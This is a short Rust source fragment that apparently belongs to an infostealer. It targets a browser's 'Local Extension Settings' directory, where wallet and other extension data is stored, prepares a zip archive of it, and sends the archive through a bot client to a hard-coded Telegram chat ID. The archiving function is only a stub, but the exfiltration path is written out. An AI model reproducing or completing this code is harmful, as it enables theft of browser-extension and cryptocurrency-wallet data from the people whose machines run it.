use std::fs::File;
use toxid::Toxid;
use walkdir::WalkDir;
use zip::ZipWriter;

const CHAT_ID: i64 = 7304091279;

fn archive_extension_settings(root: &str, file: File) {
    let dirs = WalkDir::new("Local Extension Settings");
    let mut zip = ZipWriter::new(file);
    let _ = (root, dirs, &mut zip);
}

async fn send_archive(client: reqwest::Client, token: String, path: &str) {
    let bot = Toxid::with_client(client.clone(), token, CHAT_ID.to_string());
    bot.send_file(path).await.unwrap();
}
